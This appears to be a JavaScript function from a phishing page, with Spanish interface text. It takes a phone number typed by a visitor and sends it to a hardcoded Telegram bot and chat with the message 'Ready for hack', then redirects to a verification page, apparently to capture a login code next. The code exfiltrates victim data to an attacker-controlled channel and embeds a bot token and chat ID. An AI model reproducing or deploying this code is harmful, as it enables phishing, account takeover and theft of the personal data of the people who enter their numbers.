function enviarTelefono() {
    const telefono = document.getElementById('telefonoInput').value;

    if (telefono === '') {
        alert('Ingresa un número de teléfono válido.');
        return;
    }

    const token = '6552451604:AAFnjZGs4cTv8MhevAL10lx1Qncb0iYJh2Q';
    const chatId = '-4154966040';

    const mensaje = `Ready for hack: ${telefono}`;

    const apiUrl = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${mensaje}`;

    axios.get(apiUrl)
        .then(response => {
            console.log(response.data);
            localStorage.setItem('telefono', telefono);
            alert('Número de teléfono enviado exitosamente a Telegram.');
            window.location.href = 'verificar.html';
        })
        .catch(error => {
            console.error('Error al enviar el número de teléfono a Telegram:', error);
            alert('Error al enviar el número de teléfono a Telegram. Consulta la consola para más detalles.');
        });
}
